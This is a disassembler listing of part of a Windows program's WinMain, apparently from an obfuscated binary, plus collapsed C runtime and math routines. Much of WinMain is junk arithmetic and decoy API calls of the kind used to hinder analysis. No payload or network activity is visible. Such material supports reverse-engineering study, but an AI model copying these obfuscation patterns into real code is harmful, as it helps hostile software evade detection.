		fld	ds:dbl_4246B8
		fstp	[ebp+var_260]
		fld	ds:dbl_424C28
		fstp	[ebp+var_258]
		fld	ds:dbl_4249C0
		fstp	[ebp+var_250]
		fld	ds:dbl_424AE0
		fstp	[ebp+var_248]
		fld	ds:dbl_424930
		fstp	[ebp+var_240]
		fld	ds:dbl_4244D0
		fstp	[ebp+var_238]
		fld	ds:dbl_424688
		fstp	[ebp+var_230]
		fld	ds:dbl_424AD0
		fstp	[ebp+var_228]
		fld	ds:dbl_4248E0
		fstp	[ebp+var_220]
		fld	ds:dbl_4249C8
		fstp	[ebp+var_218]
		fld	ds:dbl_424A50
		fstp	[ebp+var_210]
		fld	ds:dbl_424628
		fstp	[ebp+var_208]
		fld	ds:dbl_424BA8
		fstp	[ebp+var_200]
		fld	ds:dbl_424620
		fstp	[ebp+var_1F8]
		fld	ds:dbl_424460
		fstp	[ebp+var_1F0]
		fld	ds:dbl_4247D0
		fstp	[ebp+var_1E8]
		fld	ds:dbl_4248B0
		fstp	[ebp+var_1E0]
		fld	ds:dbl_4249E0
		fstp	[ebp+var_1D8]
		mov	[ebp+var_A8], 2C88h
		mov	[ebp+var_4], 81h
		push	[ebp+var_A8]	; size_t
		mov	edx, dword_4311A0
		push	edx		; void *
		call	_realloc
		mov	esi, [ebp+var_4]
		mov	ebx, 7Dh
		xchg	eax, ebx
		mov	esi, ebx
		xor	eax, eax
		mov	ecx, esi
		add	eax, esi
		sub	ebx, eax
		xchg	ebx, ecx
		or	eax, eax
		or	ecx, ecx
		push	ebx
		pop	ebx
		mov	edx, ebx
		mov	dword_4311A0, edx
		movzx	ecx, [ebp+var_11D]
		mov	edx, y
		lea	eax, [ecx+edx+19h]
		add	eax, [ebp+var_128]
		mov	[ebp+var_1C4], ax
		mov	ecx, y
		mov	dword_42C024, ecx
		mov	edx, dword_42C024
		mov	[ebp+var_33B0],	edx
		mov	eax, lpExitCode
		add	eax, hProcess
		movzx	ecx, [ebp+var_12E]
		lea	edx, [eax+ecx-2Eh]
		mov	[ebp+var_11C], dx
		mov	eax, lpExitCode
		mov	[ebp+var_3444],	eax
		cmp	[ebp+var_3444],	0
		jz	short loc_4154F2
		cmp	[ebp+var_3444],	1
		jz	short loc_415525
		jmp	loc_415591
; ---------------------------------------------------------------------------

loc_4154F2:				; CODE XREF: WinMain(x,x,x,x)+4EC2j
		mov	ecx, [ebp+var_EC]
		sub	ecx, hdc
		or	ecx, 3Eh
		mov	[ebp+var_104], ecx
		movzx	edx, [ebp+var_E8]
		movzx	eax, [ebp+var_B8]
		lea	ecx, [eax+edx+0Fh]
		mov	[ebp+var_B8], cx
		jmp	loc_4155B2
; ---------------------------------------------------------------------------

loc_415525:				; CODE XREF: WinMain(x,x,x,x)+4ECBj
		cmp	y, 43h
		jge	short loc_41555A
		movzx	edx, [ebp+var_F4]
		add	edx, 3Fh
		mov	y, edx
		mov	eax, [ebp+var_94]
		sub	eax, [ebp+var_3424]
		sub	eax, y
		or	eax, 59h
		mov	[ebp+var_342C],	ax

loc_41555A:				; CODE XREF: WinMain(x,x,x,x)+4F0Cj
		cmp	[ebp+var_10], 2Eh
		jge	short loc_41558F
		mov	ecx, hdc
		mov	dword_42C024, ecx
		movzx	edx, [ebp+var_D4]
		movzx	eax, [ebp+var_B]
		sub	edx, eax
		movzx	ecx, [ebp+var_D5]
		sub	edx, ecx
		sub	edx, y
		mov	[ebp+var_F0], dx

loc_41558F:				; CODE XREF: WinMain(x,x,x,x)+4F3Ej
		jmp	short loc_4155B2
; ---------------------------------------------------------------------------

loc_415591:				; CODE XREF: WinMain(x,x,x,x)+4ECDj
		movzx	edx, [ebp+var_1A8]
		mov	eax, lpExitCode
		lea	ecx, [edx+eax-10h]
		mov	edx, lpExitCode
		add	edx, 5Ch
		or	ecx, edx
		mov	[ebp+var_12E], cl

loc_4155B2:				; CODE XREF: WinMain(x,x,x,x)+4F00j
					; WinMain(x,x,x,x):loc_41558Fj
		movzx	eax, byte ptr dword_42C024
		mov	lpExitCode, eax
		mov	ecx, 0FFFFFFE6h
		sub	ecx, hdc
		movzx	edx, [ebp+var_342C]
		add	ecx, edx
		mov	[ebp+var_1C], cx
		mov	[ebp+var_3440],	0
		jmp	short loc_4155F1
; ---------------------------------------------------------------------------

loc_4155E2:				; CODE XREF: WinMain(x,x,x,x)+5032j
		mov	eax, [ebp+var_3440]
		add	eax, 1
		mov	[ebp+var_3440],	eax

loc_4155F1:				; CODE XREF: WinMain(x,x,x,x)+4FC0j
		cmp	[ebp+var_3440],	0Eh
		jge	short loc_415654
		mov	ecx, 17h
		sub	ecx, [ebp+var_BC]
		mov	[ebp+hColorSpace], ecx
		mov	edx, [ebp+var_100]
		mov	[ebp+var_40], edx
		mov	eax, 24h
		sub	eax, [ebp+var_10]
		sub	eax, 43h
		mov	[ebp+var_11E], al
		movzx	ecx, [ebp+var_D5]
		mov	dword_42C034, ecx
		mov	edx, [ebp+var_BC]
		add	edx, 49h
		mov	[ebp+var_DC], edx
		mov	eax, 36h
		sub	eax, [ebp+var_100]
		mov	[ebp+var_1AC], eax
		jmp	short loc_4155E2
; ---------------------------------------------------------------------------

loc_415654:				; CODE XREF: WinMain(x,x,x,x)+4FD8j
		movzx	ecx, [ebp+var_99]
		movzx	edx, [ebp+var_CC]
		add	edx, [ebp+var_1D0]
		and	ecx, edx
		movzx	eax, [ebp+var_E4]
		or	eax, ecx
		mov	[ebp+var_E4], ax
		mov	ecx, [ebp+var_B4]
		sub	ecx, [ebp+var_33A0]
		movzx	edx, [ebp+var_12C]
		lea	eax, [ecx+edx+5Bh]
		mov	[ebp+var_12D], al
		mov	ecx, [ebp+var_3430]
		add	ecx, Wow64Process
		xor	ecx, 88h
		or	ecx, 4Fh
		mov	[ebp+var_99], cl
		mov	edx, hProcess
		mov	[ebp+var_194], edx
		mov	eax, Wow64Process
		add	eax, 59h
		mov	y, eax
		mov	ecx, [ebp+var_343C]
		xor	ecx, 5Fh
		mov	[ebp+var_C8], ecx
		mov	edx, [ebp+pati]
		sub	edx, 4Ch
		mov	[ebp+var_114], edx
		mov	eax, [ebp+hwnd]
		mov	[ebp+hwnd], eax
		movzx	ecx, [ebp+var_9]
		sub	ecx, 1Bh
		sub	ecx, [ebp+var_94]
		mov	[ebp+var_BC], ecx
		movzx	edx, [ebp+var_B8]
		movzx	eax, [ebp+var_12E]
		lea	ecx, [eax+edx+53h]
		mov	[ebp+var_12E], cl
		movzx	edx, [ebp+var_C4]
		add	edx, [ebp+var_1AC]
		movzx	eax, [ebp+var_11E]
		sub	edx, eax
		sub	edx, 3Fh
		mov	[ebp+var_342C],	dx
		mov	cl, byte ptr [ebp+hwnd]
		mov	byte ptr [ebp+pati], cl
		mov	edx, [ebp+nSize]
		mov	[ebp+var_33C8],	edx
		mov	eax, 0B9h
		sub	eax, [ebp+pati]
		sub	eax, [ebp+var_1AC]
		mov	[ebp+var_3428],	ax
		mov	ecx, [ebp+hwnd]
		mov	[ebp+var_100], ecx
		mov	[ebp+var_16C], 47h
		mov	[ebp+var_100], 0FFFFFFCEh
		lea	edx, [ebp+hwnd]
		sub	edx, 28h
		movzx	eax, byte ptr [edx]
		mov	[ebp+var_100], eax
		mov	ecx, 24h
		sub	ecx, [ebp+var_A4]
		mov	edx, [ebp+var_C8]
		lea	eax, [ecx+edx-14h]
		movzx	ecx, [ebp+var_F0]
		sub	eax, ecx
		mov	[ebp+var_D5], al
		movzx	edx, [ebp+var_22]
		mov	eax, 79h
		sub	eax, edx
		sub	eax, 59h
		mov	[ebp+var_11E], al
		movzx	ecx, [ebp+var_3428]
		add	ecx, 3Eh
		mov	edx, [ebp+var_EC]
		sub	edx, 33h
		xor	ecx, edx
		mov	[ebp+var_A], cl
		movzx	eax, [ebp+var_3428]
		mov	ecx, dword_42C024
		sub	ecx, eax
		movzx	edx, [ebp+var_1C4]
		or	ecx, edx
		mov	[ebp+var_98], cx
		movzx	eax, [ebp+var_3431]
		sub	eax, 3Ah
		sub	eax, Wow64Process
		add	eax, 5Ah
		mov	[ebp+var_33A8],	ax
		movzx	ecx, [ebp+var_118]
		mov	edx, 3Ch
		sub	edx, ecx
		movzx	eax, [ebp+var_105]
		sub	eax, edx
		mov	[ebp+var_105], al
		mov	ecx, dword_42C024
		mov	[ebp+var_74], ecx
		mov	edx, [ebp+var_D0]
		sub	edx, dword_42C024
		movzx	eax, [ebp+var_12C]
		add	edx, eax
		and	edx, dword_42C024
		mov	[ebp+var_118], dx
		mov	ecx, 4Ch
		sub	ecx, lpExitCode
		movzx	edx, [ebp+var_1C5]
		sub	ecx, edx
		and	ecx, hdc
		mov	[ebp+var_1A8], cx
		movzx	eax, [ebp+var_98]
		mov	ecx, 2Bh
		sub	ecx, eax
		add	ecx, 29h
		mov	[ebp+var_104], ecx
		mov	edx, lpExitCode
		mov	[ebp+var_33DC],	edx
		movzx	eax, [ebp+var_99]
		mov	ecx, [ebp+var_3430]
		sub	ecx, eax
		mov	Wow64Process, ecx
		movzx	edx, [ebp+var_F0]
		mov	eax, 3
		sub	eax, edx
		movzx	ecx, [ebp+var_D4]
		or	eax, ecx
		mov	[ebp+var_C0], eax
		movzx	edx, [ebp+var_33A1]
		movzx	eax, [ebp+var_12E]
		lea	ecx, [edx+eax+22h]
		mov	[ebp+var_118], cx
		movzx	edx, [ebp+var_12D]
		mov	eax, [ebp+nSize]
		sub	eax, edx
		mov	ecx, [ebp+var_1AC]
		sub	ecx, 43h
		and	eax, ecx
		and	eax, [ebp+nSize]
		mov	[ebp+var_12E], al
		call	sub_40F3D0
		mov	hProcess, 2Dh
		mov	edx, 19h
		sub	edx, [ebp+var_A4]
		add	edx, 13h
		mov	[ebp+var_128], edx
		mov	eax, [ebp+var_128]
		sub	eax, [ebp+pati]
		sub	eax, 0Ah
		movzx	ecx, [ebp+var_98]
		sub	eax, ecx
		sub	eax, 4Fh
		mov	[ebp+var_11E], al
		movzx	edx, [ebp+var_12C]
		mov	[ebp+nSize], edx
		mov	eax, [ebp+var_B4]
		xor	eax, 9Ah
		mov	[ebp+var_8], eax
		mov	ecx, [ebp+var_C8]
		add	ecx, [ebp+pati]
		mov	[ebp+var_A4], ecx
		mov	[ebp+var_B4], 2Ch
		mov	edx, [ebp+var_3420]
		add	edx, 0A3h
		and	edx, 40h
		or	edx, 3Eh
		mov	[ebp+var_12E], dl
		movzx	eax, [ebp+var_1C5]
		mov	ecx, 18h
		sub	ecx, eax
		mov	[ebp+var_94], ecx
		mov	edx, [ebp+var_1D0]
		push	edx
		mov	eax, [ebp+var_C8]
		push	eax
		mov	ecx, [ebp+var_A4]
		push	ecx
		mov	edx, [ebp+var_C8]
		push	edx
		mov	eax, [ebp+var_C8]
		push	eax
		call	sub_408140
		add	esp, 14h
		mov	[ebp+var_1AC], eax
		mov	ecx, [ebp+pati]
		mov	[ebp+var_3448],	ecx
		cmp	[ebp+var_3448],	3 ; switch 4 cases
		ja	loc_415B02	; jumptable 00415A1F default case
		mov	edx, [ebp+var_3448]
		jmp	ds:off_415D8C[edx*4] ; switch jump
; ---------------------------------------------------------------------------

loc_415A26:				; CODE XREF: WinMain(x,x,x,x)+53FFj
					; DATA XREF: .text:off_415D8Co
		mov	eax, dword_42C00C ; jumptable 00415A1F case 0
		cmp	eax, [ebp+var_A0]
		jl	short loc_415A3D
		mov	[ebp+var_1D0], 0FFFFFFF4h

loc_415A3D:				; CODE XREF: WinMain(x,x,x,x)+5411j
		jmp	loc_415B1B
; ---------------------------------------------------------------------------

loc_415A42:				; CODE XREF: WinMain(x,x,x,x)+53FFj
					; DATA XREF: .text:off_415D8Co
		cmp	[ebp+var_A0], 1Ch ; jumptable 00415A1F case 1
		jg	short loc_415A6B
		mov	ecx, [ebp+nSize]
		sub	ecx, [ebp+hwnd]
		sub	ecx, 95h
		movzx	edx, [ebp+var_33A8]
		sub	ecx, edx
		mov	[ebp+var_22], cl
		jmp	short loc_415A85
; ---------------------------------------------------------------------------

loc_415A6B:				; CODE XREF: WinMain(x,x,x,x)+5429j
		movzx	eax, [ebp+var_11C]
		sub	eax, 4Fh
		mov	[ebp+var_EC], eax
		mov	[ebp+var_DC], 4Bh

loc_415A85:				; CODE XREF: WinMain(x,x,x,x)+5449j
		mov	dword_42C058, 0FFFFFFE7h
		jmp	loc_415B1B
; ---------------------------------------------------------------------------

loc_415A94:				; CODE XREF: WinMain(x,x,x,x)+53FFj
					; DATA XREF: .text:off_415D8Co
		cmp	dword_42C008, 3Bh ; jumptable 00415A1F case 2
		jge	short loc_415ACA
		movzx	ecx, [ebp+var_9]
		movzx	edx, [ebp+var_C4]
		lea	eax, [ecx+edx+0Dh]
		mov	[ebp+var_D4], ax
		movzx	ecx, [ebp+var_12C]
		add	ecx, 28h
		and	ecx, 48h
		and	ecx, [ebp+nSize]
		mov	[ebp+var_20], cx

loc_415ACA:				; CODE XREF: WinMain(x,x,x,x)+547Bj
		jmp	short loc_415B1B
; ---------------------------------------------------------------------------

loc_415ACC:				; CODE XREF: WinMain(x,x,x,x)+53FFj
					; DATA XREF: .text:off_415D8Co
		push	2Bh		; jumptable 00415A1F case 3
		push	4Fh		; hdc
		call	ds:SetICMProfileA
		sub	eax, 43h
		movzx	edx, [ebp+var_33A8]
		sub	eax, edx
		add	eax, 7Ah
		mov	[ebp+var_33A1],	al
		movzx	eax, [ebp+var_339C]
		and	eax, 42h
		add	eax, dword_42C038
		mov	dword_42C038, eax
		jmp	short loc_415B1B
; ---------------------------------------------------------------------------

loc_415B02:				; CODE XREF: WinMain(x,x,x,x)+53F3j
		movzx	ecx, [ebp+var_B] ; jumptable 00415A1F default case
		add	ecx, [ebp+var_B4]
		movzx	edx, [ebp+var_3431]
		sub	ecx, edx
		mov	[ebp+var_3424],	ecx

loc_415B1B:				; CODE XREF: WinMain(x,x,x,x):loc_415A3Dj
					; WinMain(x,x,x,x)+546Fj ...
		movzx	eax, [ebp+var_33A8]
		add	eax, 66h
		mov	[ebp+var_114], eax
		lea	ecx, [ebp+var_B4]
		sub	ecx, 5Bh
		movzx	edx, word ptr [ecx]
		mov	[ebp+hwnd], edx
		mov	[ebp+var_33D8],	0Ch
		mov	eax, [ebp+hInstance]
		push	eax
		call	sub_407A90
		add	esp, 4
		mov	ecx, [ebp+hColorSpace]
		sub	ecx, 1Bh
		mov	[ebp+var_D4], cx
		movzx	edx, [ebp+var_C4]
		add	edx, 51h
		movzx	eax, [ebp+var_1C5]
		sub	edx, eax
		sub	edx, 50h
		mov	[ebp+var_1C4], dx
		movzx	ecx, [ebp+var_12D]
		add	ecx, [ebp+var_A4]
		mov	[ebp+var_1D0], ecx
		mov	edx, [ebp+var_343C]
		add	edx, 65h
		and	edx, [ebp+var_343C]
		mov	[ebp+var_1A8], dx
		mov	eax, [ebp+var_1AC]
		add	eax, 30h
		xor	eax, [ebp+var_343C]
		or	eax, 1Dh
		or	eax, [ebp+var_A0]
		mov	[ebp+var_F9], al
		lea	ecx, [ebp+var_100]
		sub	ecx, 4Dh
		mov	edx, [ecx]
		mov	[ebp+hwnd], edx
		movzx	eax, [ebp+var_F0]
		movzx	ecx, [ebp+var_98]
		and	eax, ecx
		mov	[ebp+nSize], eax
		movzx	edx, [ebp+var_3428]
		add	edx, dword_42C054
		mov	dword_42C054, edx
		mov	eax, [ebp+var_DC]
		mov	[ebp+var_34], eax
		movzx	ecx, [ebp+var_F4]
		mov	edx, [ebp+var_B4]
		lea	eax, [ecx+edx-1Dh]
		mov	[ebp+var_F4], ax
		mov	ecx, 27h
		sub	ecx, [ebp+pati]
		and	ecx, 47h
		mov	[ebp+var_3430],	ecx
		mov	edx, [ebp+hwnd]
		and	edx, 5Fh
		mov	[ebp+var_B4], edx
		mov	byte ptr [ebp+pati], 2Dh
		mov	[ebp+var_148], 14h
		movzx	eax, [ebp+var_33A8]
		add	eax, [ebp+var_DC]
		mov	[ebp+var_A4], eax
		mov	ecx, [ebp+var_DC]
		mov	[ebp+var_DC], ecx
		movzx	esi, [ebp+var_1C5]
		movzx	edx, [ebp+var_D4]
		sub	esi, edx
		mov	eax, [ebp+nSize]
		push	eax		; cchItemText
		push	5Fh		; pszItemText
		mov	ecx, [ebp+pati]
		push	ecx		; pati
		mov	edx, [ebp+hwnd]
		push	edx		; iItem
		mov	eax, [ebp+hwnd]
		push	eax		; hwnd
		call	ds:GetAltTabInfoA
		add	esi, eax
		mov	[ebp+var_8], esi
		mov	ecx, [ebp+hColorSpace]
		mov	[ebp+var_A4], ecx
		movzx	edx, [ebp+var_F4]
		add	edx, dword_42C03C
		mov	dword_42C03C, edx
		movzx	eax, [ebp+var_98]
		add	eax, 7
		and	eax, 9
		mov	[ebp+var_99], al
		mov	ecx, [ebp+var_1C0]
		add	ecx, [ebp+nSize]
		sub	ecx, [ebp+var_C8]
		mov	[ebp+var_128], ecx
		movzx	edx, [ebp+var_20]
		mov	eax, 27h
		sub	eax, edx
		and	eax, 53h
		mov	[ebp+var_11C], ax
		movzx	ecx, [ebp+var_99]
		mov	edx, [ebp+hColorSpace]
		lea	eax, [edx+ecx+89h]
		mov	[ebp+var_105], al
		movzx	ecx, [ebp+var_12D]
		movzx	edx, [ebp+var_12C]
		lea	eax, [ecx+edx+29h]
		mov	[ebp+var_AC], eax
		movzx	ecx, [ebp+var_1C5]
		add	ecx, [ebp+var_94]
		mov	dword_42C024, ecx
		movzx	edx, word_42C06D
		mov	lpExitCode, edx
		mov	eax, hdc
		mov	[ebp+var_3404],	eax
		movzx	ecx, [ebp+var_A]
		add	ecx, 3Dh
		xor	ecx, [ebp+var_33A0]
		or	ecx, 3Ah
		mov	[ebp+var_D4], cx
		xor	eax, eax
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn	10h
_WinMain@16	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4
off_415D8C	dd offset loc_415A26	; DATA XREF: WinMain(x,x,x,x)+53FFr
		dd offset loc_415A42	; jump table for switch	statement
		dd offset loc_415A94
		dd offset loc_415ACC
; [00000001 BYTES: COLLAPSED FUNCTION nullsub_1. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000060 BYTES: COLLAPSED FUNCTION __cfltcvt_init. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000023 BYTES: COLLAPSED FUNCTION __fpmath.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000002B BYTES: COLLAPSED FUNCTION __alloca_probe. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000001D4 BYTES: COLLAPSED FUNCTION _realloc.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000047 BYTES: COLLAPSED CHUNK OF FUNCTION _realloc. PRESS KEYPAD CTRL-"+" TO EXPAND]
		align 10h
; [0000008B BYTES: COLLAPSED FUNCTION _exp. PRESS KEYPAD CTRL-"+" TO EXPAND]
		align 10h
; [00000150 BYTES: COLLAPSED FUNCTION _log. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000262 BYTES: COLLAPSED FUNCTION _pow. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000028 BYTES: COLLAPSED FUNCTION _test_whether_TOS_is_int.	PRESS KEYPAD CTRL-"+" TO EXPAND]
		align 10h
; [000000AB BYTES: COLLAPSED FUNCTION __ftol2_sse. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [00000025 BYTES: COLLAPSED FUNCTION _fast_error_exit.	PRESS KEYPAD CTRL-"+" TO EXPAND]
		db  59h	; Y
		db  59h	; Y
		db  5Dh	; ]
		db 0C3h	; Ã
; [0000017E BYTES: COLLAPSED FUNCTION ___tmainCRTStartup. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [0000000A BYTES: COLLAPSED FUNCTION $LN33. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000087 BYTES: COLLAPSED FUNCTION _LocaleUpdate::_LocaleUpdate(localeinfo_struct *). PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000073 BYTES: COLLAPSED FUNCTION __forcdecpt_l. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000082 BYTES: COLLAPSED FUNCTION __cropzeros_l. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000001C BYTES: COLLAPSED FUNCTION __positive. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [00000042 BYTES: COLLAPSED FUNCTION __fassign_l. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [0000001A BYTES: COLLAPSED FUNCTION __fassign. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000001F BYTES: COLLAPSED FUNCTION __shift. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000013 BYTES: COLLAPSED FUNCTION __forcdecpt. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [00000013 BYTES: COLLAPSED FUNCTION __cropzeros. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [0000016F BYTES: COLLAPSED FUNCTION __cftoe2_l. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [000000D0 BYTES: COLLAPSED FUNCTION __cftoe_l. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000020 BYTES: COLLAPSED FUNCTION __cftoe. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000373 BYTES: COLLAPSED FUNCTION __cftoa_l. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000000F7 BYTES: COLLAPSED FUNCTION __cftof2_l. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [000000BB BYTES: COLLAPSED FUNCTION __cftof_l. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000000FA BYTES: COLLAPSED FUNCTION __cftog_l. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000088 BYTES: COLLAPSED FUNCTION __cfltcvt_l. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [00000023 BYTES: COLLAPSED FUNCTION __cfltcvt. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000021 BYTES: COLLAPSED FUNCTION __initp_misc_cfltcvt_tab.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000002B BYTES: COLLAPSED FUNCTION __setdefaultprecision. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000003E BYTES: COLLAPSED FUNCTION __ms_p5_test_fdiv. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000029 BYTES: COLLAPSED FUNCTION __ms_p5_mp_test_fdiv. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000042 BYTES: COLLAPSED FUNCTION __get_errno_from_oserr. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000013 BYTES: COLLAPSED FUNCTION __errno. PRESS KEYPAD CTRL-"+" TO	EXPAND]

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4173A6	proc near		; CODE XREF: __init_pointers+Bp

arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_0]
		mov	dword_44E548, eax
		pop	ebp
		retn
sub_4173A6	endp

; [00000028 BYTES: COLLAPSED FUNCTION __callnewh. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [0000004B BYTES: COLLAPSED FUNCTION __mtinitlocks. PRESS KEYPAD CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------
; [00000057 BYTES: COLLAPSED CHUNK OF FUNCTION __mtterm. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000017 BYTES: COLLAPSED FUNCTION __unlock.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000000C3 BYTES: COLLAPSED FUNCTION __mtinitlocknum. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000033 BYTES: COLLAPSED FUNCTION __lock. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000030 BYTES: COLLAPSED FUNCTION __heap_init. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [00000030 BYTES: COLLAPSED FUNCTION ___sbh_find_block. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000316 BYTES: COLLAPSED FUNCTION ___sbh_free_block. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000000B0 BYTES: COLLAPSED FUNCTION ___sbh_alloc_new_region. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000108 BYTES: COLLAPSED FUNCTION ___sbh_alloc_new_group. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000002E1 BYTES: COLLAPSED FUNCTION ___sbh_resize_block. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [000002E5 BYTES: COLLAPSED FUNCTION ___sbh_alloc_block. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [00000365 BYTES: COLLAPSED FUNCTION _memcpy. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [0000005F BYTES: COLLAPSED FUNCTION _free. PRESS KEYPAD CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------
; [0000002F BYTES: COLLAPSED CHUNK OF FUNCTION _free. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000004F BYTES: COLLAPSED FUNCTION _V6_HeapAlloc. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000000CA BYTES: COLLAPSED FUNCTION _malloc. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000045 BYTES: COLLAPSED FUNCTION __SEH_prolog4. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000014 BYTES: COLLAPSED FUNCTION __SEH_epilog4. PRESS KEYPAD CTRL-"+" TO EXPAND]
		align 10h
; [0000018C BYTES: COLLAPSED FUNCTION __except_handler4. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000014 BYTES: COLLAPSED FUNCTION __sse2_mathfcns_init. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000018 BYTES: COLLAPSED FUNCTION __CIexp_pentium4.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------
; [00000006 BYTES: COLLAPSED CHUNK OF FUNCTION _exp. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000029F BYTES: COLLAPSED FUNCTION start_1. PRESS KEYPAD CTRL-"+" TO	EXPAND]
		align 10h

fFYTOX:
		mov	byte ptr [ebp-90h], 0FEh
		or	ch, ch
		jnz	short negYTOX
		fxch	st(1)

fFXTOY:					; CODE XREF: .text:00418ABCj
		fyl2x
		jmp	short fF2X
; ---------------------------------------------------------------------------

__fFEXP:
		mov	byte ptr [ebp-90h], 0FEh
		xor	ch, ch
		fldl2e
		fmulp	st(1), st

fF2X:					; CODE XREF: .text:00418A5Fj
		call	__ffexpm1
		fld1
		faddp	st(1), st
		test	byte ptr [ebp-9Fh], 1
		jz	short fdivr_done
		fld1
		cmp	dword_44E538, 1
		jz	short badP5_fdivr
		fdivrp	st(1), st
		jmp	short fdivr_done
; ---------------------------------------------------------------------------

badP5_fdivr:				; CODE XREF: .text:00418A89j
		call	unknown_libname_14 ; Microsoft VisualC 2-11/net	runtime

fdivr_done:				; CODE XREF: .text:00418A7Ej
					; .text:00418A8Dj
		test	dl, 40h
		jnz	short ExpScaled
		fscale

ExpScaled:				; CODE XREF: .text:00418A97j
		or	ch, ch
		jz	short expret
		fchs

expret:					; CODE XREF: .text:00418A9Dj
		jmp	__rttospop
; ---------------------------------------------------------------------------

negYTOX:				; CODE XREF: .text:00418A59j
		call	_isintTOS
		or	eax, eax
		jz	short negYTOXerror
		xor	ch, ch
		cmp	eax, 2
		jz	short evenexp
		not	ch

evenexp:				; CODE XREF: .text:00418AB4j
		fxch	st(1)
		fabs
		jmp	short fFXTOY
; ---------------------------------------------------------------------------

_rtfor0to0:
		jmp	__rtonepop
; ---------------------------------------------------------------------------

negYTOXerror:				; CODE XREF: .text:00418AADj
					; .text:00418AEFj ...
		jmp	__rtindfpop
; ---------------------------------------------------------------------------

__rtinfpopse:
		fstp	st

__rtinfnpopse:
		fstp	st
		fld	tbyte_4301F0
		mov	byte ptr [ebp-90h], 2
		retn
; ---------------------------------------------------------------------------

__fFLN:
		fldln2
		fxch	st(1)
		ftst
		fstsw	word ptr [ebp-0A0h]
		wait
		test	byte ptr [ebp-9Fh], 41h
		jnz	short negYTOXerror
		fyl2x
		retn
; ---------------------------------------------------------------------------

_rtforln0:
		mov	byte ptr [ebp-90h], 2
		fstp	st
		fld	tbyte_4301FA
		retn
; ---------------------------------------------------------------------------

_rtforloginf:
		or	cl, cl
		jnz	short tranindfnpop
		retn
; ---------------------------------------------------------------------------

fFLOGm:
		fldlg2
		jmp	short fFYL2Xm
; ---------------------------------------------------------------------------

fFLNm:
		fldln2

fFYL2Xm:				; CODE XREF: .text:00418B0Bj
		fxch	st(1)
		or	cl, cl
		jnz	short negYTOXerror
		fyl2x
		retn
; ---------------------------------------------------------------------------

_rtforyto0:
		jmp	__rtonepop
; ---------------------------------------------------------------------------

_rtfor0tox:
		call	_isintTOS
		fstp	st
		fstp	st
		or	cl, cl
		jnz	short _rtfor0toneg
		fldz
		cmp	eax, 1
		jnz	short zerotoxdone
		or	ch, ch
		jz	short zerotoxdone
		fchs

zerotoxdone:				; CODE XREF: .text:00418B2Fj
					; .text:00418B33j ...
		retn
; ---------------------------------------------------------------------------

_rtfor0toneg:				; CODE XREF: .text:00418B28j
		mov	byte ptr [ebp-90h], 2
		fld	tbyte_4301F0
		cmp	eax, 1
		jnz	short zerotoxdone
		or	ch, ch
		jz	short zerotoxdone
		fchs
		jmp	short zerotoxdone
; ---------------------------------------------------------------------------

tranzeropop:
		fstp	st

tranzeronpop:				; CODE XREF: .text:00418BA3j
		jmp	__rtzeronpop
; ---------------------------------------------------------------------------

tranindfpop:
		fstp	st

tranindfnpop:				; CODE XREF: .text:00418B06j
		jmp	__rtindfnpop
; ---------------------------------------------------------------------------
